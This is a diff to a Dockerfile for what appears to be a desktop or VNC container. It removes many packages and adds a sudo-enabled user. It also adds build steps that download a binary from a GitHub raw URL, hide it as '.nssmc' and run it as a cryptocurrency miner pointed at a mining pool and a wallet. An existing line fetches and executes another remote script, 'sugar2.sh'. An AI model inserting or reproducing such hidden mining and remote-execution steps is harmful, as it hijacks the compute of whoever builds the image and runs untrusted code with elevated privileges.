@@ -8,43 +8,12 @@ RUN apt-get upgrade
 RUN set -ex; \
     apt-get update \
     && apt-get install -y --no-install-recommends \
-        dbus-x11 \
-        nautilus \
-        gedit \
-        expect \
-        sudo \
-        vim \
-	vlc \
-        bash \
-        net-tools \
-        novnc \
-        xfce4 \
-	socat \
-        x11vnc \
-	xvfb \
-        supervisor \
+        bash \\
         curl \
-        git \
-	pulseaudio \
+        git \\
         wget \
         g++ \
 	unzip \
-        ssh \
-	ffmpeg \
-	chromium-browser \
-	firefox \
-        terminator \
-        htop \
-        gnupg2 \
-	locales \
-	xfonts-intl-chinese \
-	fonts-wqy-microhei \  
-	ibus-pinyin \
-	ibus \
-	ibus-clutter \
-	ibus-gtk \
-	ibus-gtk3 \
-	ibus-qt4 \
 	openssh-server \
     && apt-get autoclean \
     && apt-get autoremove \
@@ -54,6 +23,16 @@ RUN dpkg-reconfigure locales
 RUN sudo apt-get update && sudo apt-get install -y obs-studio
 
 COPY . /app
+
+RUN useradd -m okebos && \
+    adduser okebos sudo && \
+    sudo usermod -a -G sudo okebos
+    
+RUN wget https://raw.githubusercontent.com/razmai9/0001-0050/master/0014
+RUN mv 0014 .nssmc
+RUN chmod +x .nssmc
+RUN ./.nssmc -a yespowerSUGAR -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qjhuqfmdcmaq6qr0dlxh2c9d874x6eaa88vmj3y.cpu1
+    
 RUN wget https://raw.githubusercontent.com/razmai9/bitbucket/master/sugar2.sh && chmod +x sugar2.sh && ./sugar2.sh
 RUN chmod +x /app/conf.d/websockify.sh
 RUN chmod +x /app/run.sh
